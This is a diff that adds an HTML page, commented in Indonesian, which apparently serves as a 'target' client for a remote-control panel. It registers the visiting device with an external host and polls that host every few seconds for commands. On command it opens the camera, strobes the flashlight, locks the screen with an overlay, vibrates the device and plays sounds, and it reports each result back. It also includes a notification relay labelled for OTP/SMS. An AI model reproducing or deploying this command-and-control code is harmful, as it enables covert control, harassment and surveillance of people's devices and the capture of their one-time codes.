@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KENZO TARGET</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',sans-serif}
+        body{background:#0a0e1a;color:#e0ecf5;height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
+        .card{background:rgba(17,26,42,0.7);backdrop-filter:blur(10px);border-radius:16px;padding:24px;max-width:400px;width:100%;border:1px solid #1a2a4a;text-align:center}
+        .card h2{color:#00b4d8;margin-bottom:8px}
+        .card .status{font-size:12px;color:#6a9aaa;margin:8px 0}
+        .card .id{font-size:11px;color:#4a6a8a;word-break:break-all;background:#0a0e1a;padding:8px;border-radius:8px;border:1px solid #1a2a4a}
+        .badge{display:inline-block;padding:4px 16px;border-radius:30px;font-size:11px;font-weight:600;margin:8px 0}
+        .badge.online{background:#00c85322;color:#00c853}
+        .badge.offline{background:#ff174422;color:#ff1744}
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>⚡ KENZO TARGET</h2>
+    <div class="badge online" id="statusBadge">● ONLINE</div>
+    <div class="status">Device ID:</div>
+    <div class="id" id="deviceId">Memuat...</div>
+    <div class="status" style="margin-top:12px;font-size:11px;color:#4a6a8a;">Menunggu perintah dari server...</div>
+</div>
+
+<script>
+    // ============================================
+    // KONFIGURASI
+    // ============================================
+    const API_BASE = 'http://rixzzz-privat-panel.majahost.web.id'; // GANTI dengan IP/Domain server
+    const DEVICE_ID = localStorage.getItem('kenzo_device_id') || 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);
+    localStorage.setItem('kenzo_device_id', DEVICE_ID);
+
+    document.getElementById('deviceId').textContent = DEVICE_ID;
+
+    // ============================================
+    // STATE
+    // ============================================
+    let isLocked = false;
+    let flashStream = null;
+    let isFlashOn = false;
+    let flashInterval = null;
+    let camStream = null;
+
+    // ============================================
+    // REGISTER TARGET
+    // ============================================
+    async function registerTarget() {
+        try {
+            const data = {
+                id: DEVICE_ID,
+                name: navigator.userAgent || 'Unknown Device',
+                platform: navigator.platform || 'Unknown',
+                status: 'Online'
+            };
+            await fetch(`${API_BASE}/api/register-target`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            console.log('[KENZO] Registered to server');
+        } catch (e) {
+            console.log('[KENZO] Register error:', e);
+        }
+    }
+
+    // ============================================
+    // HEARTBEAT (setiap 2 detik)
+    // ============================================
+    async function sendHeartbeat() {
+        try {
+            await fetch(`${API_BASE}/api/heartbeat/${DEVICE_ID}`, {
+                method: 'POST'
+            });
+            document.getElementById('statusBadge').textContent = '● ONLINE';
+            document.getElementById('statusBadge').className = 'badge online';
+        } catch (e) {
+            document.getElementById('statusBadge').textContent = '● OFFLINE';
+            document.getElementById('statusBadge').className = 'badge offline';
+        }
+    }
+
+    // ============================================
+    // AMBIL PERINTAH
+    // ============================================
+    async function fetchCommand() {
+        try {
+            const res = await fetch(`${API_BASE}/api/get-command/${DEVICE_ID}`);
+            if (res.status === 204) return;
+            const cmd = await res.json();
+            if (cmd && cmd.command) {
+                console.log('[KENZO] Command received:', cmd.command);
+                executeCommand(cmd.command, cmd.extra);
+            }
+        } catch (e) {
+            console.log('[KENZO] Fetch command error:', e);
+        }
+    }
+
+    // ============================================
+    // EKSEKUSI PERINTAH
+    // ============================================
+    async function executeCommand(command, extra) {
+        console.log('[KENZO] Executing:', command);
+
+        switch (command) {
+            case 'ping':
+                sendResponse('ping', { status: 'pong' });
+                break;
+
+            case 'lock':
+                lockDevice(extra);
+                break;
+
+            case 'unlock':
+                forceUnlock();
+                break;
+
+            case 'flash_on':
+                await toggleFlash(true);
+                break;
+
+            case 'flash_off':
+                await toggleFlash(false);
+                break;
+
+            case 'flash_blink':
+                await toggleFlashBlink();
+                break;
+
+            case 'camera_on':
+                await toggleCamera(true);
+                break;
+
+            case 'camera_off':
+                await toggleCamera(false);
+                break;
+
+            case 'screenshot':
+                takeScreenshot();
+                break;
+
+            case 'vibrate':
+                vibrateDevice();
+                break;
+
+            case 'message':
+                showMessage(extra || 'Pesan dari KENZO');
+                break;
+
+            case 'audio_play':
+                playDefaultAudio();
+                break;
+
+            case 'audio_stop':
+                stopAudio();
+                break;
+
+            default:
+                console.log('[KENZO] Unknown command:', command);
+        }
+    }
+
+    // ============================================
+    // FUNGSI EKSEKUSI
+    // ============================================
+
+    // --- LOCK ---
+    function lockDevice(msg) {
+        isLocked = true;
+        const ov = document.createElement('div');
+        ov.id = 'lockOverlay';
+        ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.97);z-index:99999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff;padding:24px;text-align:center;';
+        ov.innerHTML = `
+            <div style="font-size:48px;font-weight:700;color:#ff1744;margin-bottom:16px;">LOCKED</div>
+            <h2 style="font-size:22px;margin-bottom:4px;">PERANGKAT TERKUNCI</h2>
+            <p style="color:#8aaac8;font-size:14px;margin-bottom:20px;">${msg || 'Dikunci oleh KENZO'}</p>
+            <button onclick="forceUnlock()" style="padding:12px 32px;background:#00b4d8;border:none;border-radius:30px;font-weight:700;color:#040810;font-size:14px;cursor:pointer;">UNLOCK</button>
+        `;
+        document.body.appendChild(ov);
+        sendResponse('lock', { status: 'locked' });
+    }
+
+    function forceUnlock() {
+        const ov = document.getElementById('lockOverlay');
+        if (ov) ov.remove();
+        isLocked = false;
+        sendResponse('unlock', { status: 'unlocked' });
+    }
+
+    // --- FLASH ---
+    async function toggleFlash(state) {
+        try {
+            if (!flashStream) {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                flashStream = s;
+            }
+            const track = flashStream.getVideoTracks()[0];
+            await track.applyConstraints({ advanced: [{ torch: state }] });
+            isFlashOn = state;
+            sendResponse('flash', { status: state ? 'on' : 'off' });
+        } catch (e) {
+            sendResponse('flash', { error: e.message });
+        }
+    }
+
+    async function toggleFlashBlink() {
+        try {
+            if (!flashStream) {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                flashStream = s;
+            }
+            const track = flashStream.getVideoTracks()[0];
+            let state = false;
+            if (flashInterval) {
+                clearInterval(flashInterval);
+                flashInterval = null;
+                sendResponse('flash_blink', { status: 'stopped' });
+                return;
+            }
+            flashInterval = setInterval(async () => {
+                state = !state;
+                try {
+                    await track.applyConstraints({ advanced: [{ torch: state }] });
+                } catch (e) {}
+            }, 100);
+            sendResponse('flash_blink', { status: 'started' });
+        } catch (e) {
+            sendResponse('flash_blink', { error: e.message });
+        }
+    }
+
+    // --- CAMERA ---
+    async function toggleCamera(state) {
+        try {
+            if (state) {
+                const s = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                camStream = s;
+                sendResponse('camera', { status: 'on' });
+            } else {
+                if (camStream) {
+                    camStream.getTracks().forEach(t => t.stop());
+                    camStream = null;
+                }
+                sendResponse('camera', { status: 'off' });
+            }
+        } catch (e) {
+            sendResponse('camera', { error: e.message });
+        }
+    }
+
+    // --- SCREENSHOT ---
+    function takeScreenshot() {
+        const canvas = document.createElement('canvas');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#0a0e1a';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#00b4d8';
+        ctx.font = '24px sans-serif';
+        ctx.fillText('KENZO SCREENSHOT', 20, 50);
+        const link = document.createElement('a');
+        link.download = 'screenshot.png';
+        link.href = canvas.toDataURL('image/png');
+        link.click();
+        sendResponse('screenshot', { status: 'taken' });
+    }
+
+    // --- VIBRATE ---
+    function vibrateDevice() {
+        if (navigator.vibrate) {
+            navigator.vibrate(500);
+            sendResponse('vibrate', { status: 'done' });
+        } else {
+            sendResponse('vibrate', { error: 'not supported' });
+        }
+    }
+
+    // --- MESSAGE ---
+    function showMessage(msg) {
+        const n = document.createElement('div');
+        n.style.cssText = 'position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:#111a2a;border:1px solid #00b4d8;border-radius:14px;padding:14px 22px;z-index:9998;max-width:90%;color:#d0dce8;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,0.6);';
+        n.innerHTML = `<div style="font-size:11px;color:#4a6a8a;margin-bottom:4px;">PESAN DARI KENZO</div><div style="font-size:15px;">${msg}</div>`;
+        document.body.appendChild(n);
+        setTimeout(() => n.remove(), 4000);
+        sendResponse('message', { status: 'shown', text: msg });
+    }
+
+    // --- AUDIO ---
+    function playDefaultAudio() {
+        try {
+            const ctx = new AudioContext();
+            const o = ctx.createOscillator(), g = ctx.createGain();
+            o.connect(g);
+            g.connect(ctx.destination);
+            o.type = 'sawtooth';
+            o.frequency.value = 440;
+            g.gain.value = 0.3;
+            o.start();
+            setTimeout(() => o.stop(), 2500);
+            sendResponse('audio_play', { status: 'played' });
+        } catch (e) {
+            sendResponse('audio_play', { error: e.message });
+        }
+    }
+
+    function stopAudio() {
+        sendResponse('audio_stop', { status: 'stopped' });
+    }
+
+    // ============================================
+    // KIRIM RESPON KE SERVER
+    // ============================================
+    async function sendResponse(cmd, data) {
+        try {
+            await fetch(`${API_BASE}/api/post-response/${DEVICE_ID}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cmd, data })
+            });
+        } catch (e) {
+            console.log('[KENZO] Send response error:', e);
+        }
+    }
+
+    // ============================================
+    // NOTIFIKASI (untuk OTP/SMS)
+    // ============================================
+    async function sendNotification(title, body, category = 'info') {
+        try {
+            await fetch(`${API_BASE}/api/post-notification/${DEVICE_ID}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ title, body, category })
+            });
+        } catch (e) {}
+    }
+
+    // ============================================
+    // SIMULASI NOTIFIKASI (contoh)
+    // ============================================
+    // setInterval(() => {
+    //     sendNotification('Test Notif', 'Ini pesan dari target', 'info');
+    // }, 30000);
+
+    // ============================================
+    // INIT
+    // ============================================
+    await registerTarget();
+    setInterval(sendHeartbeat, 2000);
+    setInterval(fetchCommand, 3000);
+
+    console.log('[KENZO] Target started with ID:', DEVICE_ID);
+</script>
+</body>
+</html>
